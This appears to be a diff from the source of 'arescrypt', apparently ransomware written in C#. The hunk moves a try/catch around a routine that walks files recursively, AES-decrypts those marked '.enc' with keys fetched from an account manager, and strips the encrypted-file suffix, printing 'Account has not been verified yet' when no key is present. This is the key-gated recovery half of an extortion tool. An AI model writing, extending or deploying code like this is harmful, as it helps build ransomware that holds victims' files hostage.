@@ -81,31 +81,27 @@ namespace arescrypt
         {
             UserData CryptoKeys = accountManager.GetCryptoKeys();
             string[] fullFileIndex = GetRecursiveFiles().ToArray();
-
-            if (CryptoKeys.encKey != null && CryptoKeys.encKey != "")
+            
+            try
             {
-                foreach (string file in fullFileIndex)
+                if (CryptoKeys.encKey != null && CryptoKeys.encKey != "")
                 {
-                    if (file.Contains(".enc"))
+                    foreach (string file in fullFileIndex)
                     {
-                        if (Cryptography.DecryptFile_Aes(file, Convert.FromBase64String(CryptoKeys.encKey.Replace(" ", "+")), Convert.FromBase64String(CryptoKeys.encIV.Replace(" ", "+"))))
+                        if (file.Contains(".enc"))
                         {
-                            if (FileHandler.subtractSuffixFromFile(config.encryptedFileSuffix, file))
-                                Console.WriteLine("File, " + file, ", was decrypted successfully.");
-                        }
-                        else
-                        {
-                            Console.WriteLine("file, " + file + ", couldn't be decrypted.");
+                            if (Cryptography.DecryptFile_Aes(file, Convert.FromBase64String(CryptoKeys.encKey.Replace(" ", "+")), Convert.FromBase64String(CryptoKeys.encIV.Replace(" ", "+"))))
+                            {
+                                if (FileHandler.subtractSuffixFromFile(config.encryptedFileSuffix, file))
+                                    Console.WriteLine("File, " + file, ", was decrypted successfully.");
+                            }
+                            else
+                                Console.WriteLine("file, " + file + ", couldn't be decrypted.");
                         }
                     }
                 }
-            }
-            else
-            { Console.WriteLine("\nAccount has not been verified yet."); }
-
-            try
-            {
-                
+                else
+                { Console.WriteLine("\nAccount has not been verified yet."); }
             } catch (Exception exc) { Console.WriteLine("\n\n-- Runtime Error --\nMessage: " + exc.Message + "\n" + exc.InnerException); }
         }
         /* END ENCRYPTION/DECRYPTION SECTION */
